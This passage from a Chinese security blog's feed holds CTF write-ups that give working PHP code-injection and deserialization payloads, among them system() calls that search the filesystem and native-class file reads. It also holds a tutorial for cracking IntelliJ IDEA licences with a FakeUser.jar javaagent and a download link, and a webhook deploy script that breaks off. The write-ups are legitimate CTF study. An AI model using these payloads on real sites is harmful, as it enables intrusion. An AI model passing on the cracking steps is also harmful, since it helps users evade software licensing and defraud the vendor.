class="hljs-variable">$b</span>-&gt;func=<span class="hljs-string">&quot;create_function&quot;</span>;<br><span class="hljs-variable">$b</span>-&gt;arg=<span class="hljs-string">&#x27;&#125;require(~(&#x27;</span>.<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$ac</span>).<span class="hljs-string">&#x27;));//&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));          <span class="hljs-comment">//这里做url编码是因为取反后很多字符打印不出来</span><br></code></pre></td></tr></table></figure><p><img src="http://81.70.101.23:11111/i/2022/03/31/qsjhg1_0.png"><br>传入<code>?pop=O%3A1%3A%22A%22%3A1%3A%7Bs%3A3%3A%22var%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A15%3A%22create_function%22%3Bs%3A3%3A%22arg%22%3Bs%3A77%3A%22%7Drequire%28%7E%28%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%AB%8D%8A%CC%99%93%9E%98%D1%8F%97%8F%29%29%3B%2F%2F%22%3B%7D%7D</code><br><img src="http://81.70.101.23:11111/i/2022/03/31/qsjnvi_0.png"></p><p>参考：<br><a href="https://www.its304.com/article/cosmoslin/120526877">https://www.its304.com/article/cosmoslin/120526877</a><br><a href="http://www.ctfking.com/2021/10013264.html">http://www.ctfking.com/2021/10013264.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF Oct X 吉林工师 题目复现</title>
    <link href="/2022/03/27/DASCTFX%E5%90%89%E6%9E%97%E5%B7%A5%E5%B8%88%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/03/27/DASCTFX%E5%90%89%E6%9E%97%E5%B7%A5%E5%B8%88%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上个暑期末接触CTF，上学期打的比赛报名了连签到都做不出来<br>看见buu上还有题目环境，重新看看，不一样的感觉哎<br>这个比赛misc题占大半，果然是魔法世界</p><h2 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h2><p>源码直接给出来了<br><img src="http://81.70.101.23:11111/i/2022/03/27/z0osag_0.png"><br>分析一下这段代码，学到新的php知识还是蛮多的</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);         <span class="hljs-comment">//把以GET方式传入的参数自动转换为正常的变量，可以直接调用变量，extract($_GET)的数值为传入参数的个数</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">String2Array</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)            //漏洞函数</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();<br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$array = <span class="hljs-subst">$data</span>;&quot;</span>);          <span class="hljs-comment">//执行点: eval，\$符号是shell脚本中的特殊符号，可以将 $array 数组类型数据执行</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$array</span>;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$attrid</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$attrvalue</span>))<br>&#123;<br>        <span class="hljs-variable">$attrstr</span> .= <span class="hljs-string">&#x27;array(&#x27;</span>;           <span class="hljs-comment">//PHP中.=是在原有变量基础上加，而不是重新赋值。比如 `$a.=&quot;a&quot;;$a.=&quot;b&quot;;echo $a;` 将输出ab</span><br>        <span class="hljs-variable">$attrids</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$attrid</span>);      <span class="hljs-comment">//count函数，返回数组中的元素长度</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$attrids</span>; <span class="hljs-variable">$i</span>++)<br>        &#123;<br>            <span class="hljs-variable">$attrstr</span> .= <span class="hljs-string">&#x27;&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$attrid</span>[<span class="hljs-variable">$i</span>]).<span class="hljs-string">&#x27;&quot;=&gt;&#x27;</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>.<span class="hljs-variable">$attrvalue</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&#x27;&quot;&#x27;</span>;       <span class="hljs-comment">//intval返回整数值</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$attrids</span>-<span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-variable">$attrstr</span> .= <span class="hljs-string">&#x27;,&#x27;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$attrstr</span> .= <span class="hljs-string">&#x27;);&#x27;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">String2Array</span>(<span class="hljs-variable">$attrstr</span>);<br><br></code></pre></td></tr></table></figure><p>所以解题的关键在于构造出一个$attrid和$attrvalue使最终的$attrstr是完整的数组类型数据<br>从而成功调用String2Array这个漏洞函数</p><p>先假想传个参?attrid[]&#x3D;1&amp;attrvalue[]&#x3D;a<br>放入第二段代码，得出的$attrstr应该为’arrar(“1”&#x3D;&gt;”a”);’</p><p>如果想进行命令执行比如phpinfo，传入attrid[]&#x3D;1&amp;attrvalue[]&#x3D;phpinfo()是不行的<br>这点我不太确定，因为用php在线执行网站可以，自己搭的环境不行<br>没太搞懂，个人理解可能是得出的$attrstr为’arrar(“1”&#x3D;&gt;”phpinfo()”);’中的phpinfo是带双引号的，不能被执行</p><p>所以要绕过这个双引号就要像sql注入一样前后各闭合去注入<br>payload: <code>?attrid[]=1&amp;attrvalue[]=1&quot;,&quot;2&quot;=&gt;phpinfo(),&quot;3&quot;=&gt;&quot;1</code><br>此时得到的$attrsr为 array(“1”&#x3D;&gt;”1”,”2”&#x3D;&gt;phpinfo(),”3”&#x3D;&gt;”1”); 是可行的<br>flag可以在phpinfo里搜到</p><p>想通过sysytem这种函数 ls找目录+cat查内容 在这题找不到，因为flag不在html或者根目录<br>不过可以用system+grep递归搜索字符串<code>flag&#123;</code><br>payload: <code>?attrid[]=1&amp;attrvalue[]=1&quot;,&quot;2&quot;=&gt;system(&#39;grep -r &quot;flag&#123;&quot; /&#39;),&quot;3&quot;=&gt;&quot;1</code><br><img src="http://81.70.101.23:11111/i/2022/03/27/10o01hk_0.png"></p><p>ps：上网找资料的时候发现这个string2array漏洞是两年前cms上比较火的漏洞，主要是没有考虑用户是否能控制这个字符串，<br>    被eval将字符串以代码执行形成漏洞</p><p>——-3月29日更———<br>震惊，发现一位大佬的非预期解<br>payload：<code>?attrstr=phpinfo();</code><br>原理是开头的<code>extract($_GET);</code>能将传入的参数自动转换为变量，直接跳过第二部分执行<code>String2Array($attrstr);</code><br>秒~~~~~~~~~~~~~~啊!</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow卷王杯-Web</title>
    <link href="/2022/03/25/ctfshow%E5%8D%B7%E7%8E%8B%E6%9D%AF-Web/"/>
    <url>/2022/03/25/ctfshow%E5%8D%B7%E7%8E%8B%E6%9D%AF-Web/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>不知不觉又咕了好久时间，年后比赛很多，ctfshow卷王杯&#x2F;VNCTF&#x2F;D^3CTF-AntCTF&#x2F;虎符杯&#x2F;红明谷杯&#x2F;D^3CTF-SU&#x2F;MRCTF<br>基本上不是去签到的就是去坐牢的，一个个来复现吧</p><h2 id="ctfshow卷王杯"><a href="#ctfshow卷王杯" class="headerlink" title="ctfshow卷王杯"></a>ctfshow卷王杯</h2><h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><p>打开网页 “so easy,just soso”<br><img src="http://81.70.101.23:11111/i/2022/03/27/nida2n_0.png"><br>查看网页源代码，可以看到提示<!--?source--><br><img src="http://81.70.101.23:11111/i/2022/03/27/niddvf_0.png"><br>在url后加上?source后看到题目源代码<br><img src="http://81.70.101.23:11111/i/2022/03/27/nidbg0_0.png"></p><figure class="highlight php-template"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"> </span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="language-php">    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="language-php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\$flag_filename = &#x27;flag&#x27;.md5(???).&#x27;php&#x27;;&quot;</span>;        <span class="hljs-comment">//flag文件名</span></span><br><span class="language-php">    <span class="hljs-keyword">die</span>();</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="language-php">    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];</span><br><span class="language-php">    <span class="hljs-variable">$count</span>[++<span class="hljs-variable">$c</span>] = <span class="hljs-number">1</span>;</span><br><span class="language-php">    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$count</span>[] = <span class="hljs-number">1</span>) &#123;              <span class="hljs-comment">//数组溢出</span></span><br><span class="language-php">        <span class="hljs-variable">$count</span>[++<span class="hljs-variable">$c</span>] = <span class="hljs-number">1</span>;</span><br><span class="language-php">        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$count</span>);</span><br><span class="language-php">        <span class="hljs-keyword">die</span>();</span><br><span class="language-php">    &#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php">        <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];</span><br><span class="language-php">        <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];</span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);            <span class="hljs-comment">//PHP原生类利用</span></span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>easyweb<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.css&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;stars&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;stars2&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;stars3&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: relative;bottom:100px;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;15&quot;</span>&gt;</span>so easy，just soso<span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"><span class="hljs-selector-tag">body</span>&#123;<span class="hljs-attribute">text-align</span>:center&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!--?source--&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">$flag_filename = &#x27;flag&#x27;.md5(???).&#x27;php&#x27;;</span><br></code></pre></td></tr></table></figure><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目考点有两部分：绕过数组溢出，利用php原生类<br>其中利用原生类又可以分为遍历目录得到flag文件名和读取flag文件</p><p>数组溢出介绍：<br>当int型变量大到一定数值后会溢出，变成float数值<br>在php的int数组中，数组的索引最大下标就是这个最大int数，对数组再进行追加赋值就会造成数组溢出<br>关键代码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$count</span>[++<span class="hljs-variable">$c</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$count</span>[++<span class="hljs-variable">$c</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$count</span>[] = <span class="hljs-number">1</span>) &#123;              <span class="hljs-regexp">//</span>判断条件是一个=，即赋值操作。只要把赋值操作失败返回false就能绕过判断<br>    <span class="hljs-variable">$count</span>[++<span class="hljs-variable">$c</span>] = <span class="hljs-number">1</span>;<br>    print_r(<span class="hljs-variable">$count</span>);<br>    die();<br>&#125;<br></code></pre></td></tr></table></figure><p>查php手册或者百度，可以知道int临界值32位是2^31-1、64位是2^63-1，即2147483647和9223372036854775807</p><p>尝试把c&#x3D;1代入进行尝试<br><img src="http://81.70.101.23:11111/i/2022/03/27/nidn3v_0.png"><br>返回了数组array，2是第一次<code>$count[++$c] = 1;</code>，3是第二次if循环中的<code>$count[++$c] = 1;</code><br>如果第一次++c&#x3D;9223372036854775807，if判断里的追加数组就会失败，返回false，达到目的（这里需要尝试是32位还是64位）</p><p>所以对c赋值9223372036854775806尝试<br><img src="http://81.70.101.23:11111/i/2022/03/27/nidnpm_0.png"><br>没有回显，应该对了，因为a、b都是空的，还没赋值。</p><p>php原生类<br>由于$a被作为类去echo new $a($b)，而且题目中没有自定义，所以只能使用php中的原生类，即不需要被自定义就能使用的类</p><p>遍历目录类：DirectoryIterator、FilesystemIterator、GlobIterator<br>其中和FilesystemIterator需要glob协议配合才能暴力匹配<br>GlobIterator自带glob协议，不需要再加glob<br>glob:&#x2F;&#x2F;flag[0-9a-z]*其中的[0-9a-z]是通配字母数字，可以参考p神的那篇无字母数字命令执行，后面的<code>*</code>通配32位</p><p>以DirectoryIterator为例加glob协议遍历目录匹配<br><img src="http://81.70.101.23:11111/i/2022/03/27/nicki0_0.png"><br>可以读取flag文件名<br>当时我用的是一种非预期用?来进行通配，因为64位md5后固定是32位字母+数字，所以可以用32个?通配<br>是可行的<br><img src="http://81.70.101.23:11111/i/2022/03/27/nickgd_0.png"></p><p>读取文件类：SplFileObject<br><img src="http://81.70.101.23:11111/i/2022/03/27/nid2rx_0.png"><br>SplFileObject类输出的是其中__construct迭代器内容，只读取一行<br>如果题目坏坏第一行是echo一个假的flag，第二行才是真的flag且没有输出<br>则可以配合php伪协议来输出，也是可行的<br><img src="http://81.70.101.23:11111/i/2022/03/27/niddko_0.png"></p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>a&#x3D;DirectoryIterator&amp;b&#x3D;glob:&#x2F;&#x2F;flag[0-9a-z]*&amp;c&#x3D;9223372036854775806<br>a&#x3D;DirectoryIterator&amp;b&#x3D;glob:&#x2F;&#x2F;flag????????????????????????????????.php&amp;c&#x3D;9223372036854775806<br>a&#x3D;SplFileObjectr&amp;b&#x3D;glob:&#x2F;&#x2F;flag56ea8b83122449e814e0fd7bfb5f220a.php&amp;c&#x3D;9223372036854775806</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JetBrain系列产品free激活至2099年</title>
    <link href="/2022/02/25/JetBrain%E7%B3%BB%E5%88%97%E4%BA%A7%E5%93%81free%E6%BF%80%E6%B4%BB%E8%87%B32099%E5%B9%B4/"/>
    <url>/2022/02/25/JetBrain%E7%B3%BB%E5%88%97%E4%BA%A7%E5%93%81free%E6%BF%80%E6%B4%BB%E8%87%B32099%E5%B9%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>个人为了学习和研究软件内含的设计思想和原理可进行尝试。<br/><br><strong>仅用于学习交流</strong>，严禁用做商业用途，否则自行承担后果。<br/><br>本文以IntelliJ IDEA 专业版2.4为例，2022年3.0及以上版本可行性不明。<br/><br><strong>本文所使用的工具在文末链接可取。</strong><br><br/></p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>官方下载网站：<a href="https://www.jetbrains.com/idea/download/">JetBrain官网</a><br/><br>进入网站<br><img src="http://81.70.101.23:11111/i/2022/03/27/nfpxv1_0.png"><br><br/><br>Other versions-选择2.4-windows版本下载<br><img src="http://81.70.101.23:11111/i/2022/03/27/nfq40f_0.png"><br><br/></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>双击setup程序，这里可以先把这两项勾选上，之后一路Next<br><img src="http://81.70.101.23:11111/i/2022/03/27/nfq2dm_0.png"></p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>下载好后运行程序<br><br/></p><h3 id="Activation-界面"><a href="#Activation-界面" class="headerlink" title="Activation 界面"></a>Activation 界面</h3><p><img src="http://81.70.101.23:11111/i/2022/03/27/nfq3s7_0.png"><br><br/><br>第一次进入要先选择Start trial————Log In to JetBrains Account<br/><br><img src="http://81.70.101.23:11111/i/2022/03/27/nfq1gc_0.png"><br><br/><br>进入官网注册&#x2F;登录账号，再返回，就变成这个页面了<br><img src="http://81.70.101.23:11111/i/2022/03/27/nfq7e9_0.png"><br><br/><br>不用勾选，点击Start Trial<br><img src="http://81.70.101.23:11111/i/2022/03/27/nfqamk_0.png"><br>这里可以看到有效期为1个月，到2022年的3月15日，直接Continue</p><h3 id="编译器-界面"><a href="#编译器-界面" class="headerlink" title="编译器 界面"></a>编译器 界面</h3><p>找到齿轮符号，点击 Edit Custom VM Options…<br><img src="http://81.70.101.23:11111/i/2022/03/27/nfq9mp_0.png"><br>如果没有这个页面，下面有讲进入软件后Help里也有这个选项<br><br/><br>在这个文档的最后添加一句话：<br>-javaagent:D:_App\IntelliJ IDEA 2021.2.4\FakeUser.jar<br><img src="http://81.70.101.23:11111/i/2022/03/27/nfpmrb_0.png"><br><br/></p><p><em>注意，这个FakeUser.jar是复制到你安装目录里去的</em><br><em>这个<code>D:\_App\IntelliJ IDEA 2021.2.4</code>也就是我的安装路径</em><br>保存后关闭程序</p><h3 id="重新运行"><a href="#重新运行" class="headerlink" title="重新运行"></a>重新运行</h3><p>重新运行程序<br/><br>这次选择Activate IntelliJ IDEA————Activation code————输入密钥————点击Activate<br>就可以激活。<br><img src="http://81.70.101.23:11111/i/2022/03/27/nfpnpe_0.png"><br><br/><br>可以看到激活至2099年12月31日了<br><img src="http://81.70.101.23:11111/i/2022/03/27/nfprb2_0.png"><br><br/><br>如果在进入页面没有点Edit Custom VM Options…<br>可以在选择一个project进入后，点Help————Edit Custom VM Options…<br><img src="http://81.70.101.23:11111/i/2022/03/27/nfpodh_0.png"><br><br/></p><h1 id="jar包及激活码获取"><a href="#jar包及激活码获取" class="headerlink" title="jar包及激活码获取"></a>jar包及激活码获取</h1><p>链接：<a href="https://pan.baidu.com/s/1hUwKh89N4mNSAzVlbg45zQ">https://pan.baidu.com/s/1hUwKh89N4mNSAzVlbg45zQ</a><br>提取码：2333</p>]]></content>
    
    
    
    <tags>
      
      <tag>技术分享</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo结合宝塔webhook实现自动化部署</title>
    <link href="/2022/02/24/hexo%E7%BB%93%E5%90%88%E5%AE%9D%E5%A1%94webhook%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/"/>
    <url>/2022/02/24/hexo%E7%BB%93%E5%90%88%E5%AE%9D%E5%A1%94webhook%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近不是在弄hexo的自动化部署嘛，用宝塔面板自带的webhook v1.2，之前弄不太行，今天终于知道为啥了，其实自动化的js脚本知道原理后自己就可以改改了。</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><h2 id="标准git自动上传服务器的代码"><a href="#标准git自动上传服务器的代码" class="headerlink" title="标准git自动上传服务器的代码"></a>标准git自动上传服务器的代码</h2><p><em>这是官方给出的代码段，其中$1大家对其争议比较大，自己多试试哈哈，我的上下两个$1就不一样。</em></p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment">#输出当前时间</span><br><span class="hljs-built_in">date</span> --<span class="hljs-built_in">date</span>=<span class="hljs-string">&#x27;0 days ago&#x27;</span> <span class="hljs-string">&quot;+%Y-%m-%d %H:%M:%S&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Start&quot;</span><br><span class="hljs-comment">#判断宝塔WebHook参数是否存在</span><br><span class="hljs-keyword">if</span> [ ! -n <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> ];<br><span class="hljs-keyword">then</span> <br>          <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;param参数错误&quot;</span><br>          <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;End&quot;</span><br>          <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-comment">#git项目路径</span><br>gitPath=<span class="hljs-string">&quot;/www/wwwroot/<span class="hljs-variable">$1</span>&quot;</span><br><span class="hljs-comment">#git 网址</span><br>gitHttp=<span class="hljs-string">&quot;https://gitee.com/rizadon/<span class="hljs-variable">$1</span>.git&quot;</span><br> <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Web站点路径：<span class="hljs-variable">$gitPath</span>&quot;</span><br> <br><span class="hljs-comment">#判断项目路径是否存在</span><br><span class="hljs-keyword">if</span> [ -d <span class="hljs-string">&quot;<span class="hljs-variable">$gitPath</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">cd</span> <span class="hljs-variable">$gitPath</span><br>        <span class="hljs-comment">#判断是否存在git目录</span><br>        <span class="hljs-keyword">if</span> [ ! -d <span class="hljs-string">&quot;.git&quot;</span> ]; <span class="hljs-keyword">then</span><br>                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;在该目录下克隆 git&quot;</span><br>                git <span class="hljs-built_in">clone</span> <span class="hljs-variable">$gitHttp</span> gittemp<br>                <span class="hljs-built_in">mv</span> gittemp/.git .<br>                <span class="hljs-built_in">rm</span> -rf gittemp<br>        <span class="hljs-keyword">fi</span><br>        <span class="hljs-comment">#拉取最新的项目文件</span><br>        git reset --hard origin/master<br>        git pull<br>        <span class="hljs-comment">#设置目录权限</span><br>        <span class="hljs-built_in">chown</span> -R www:www <span class="hljs-variable">$gitPath</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;End&quot;</span><br>        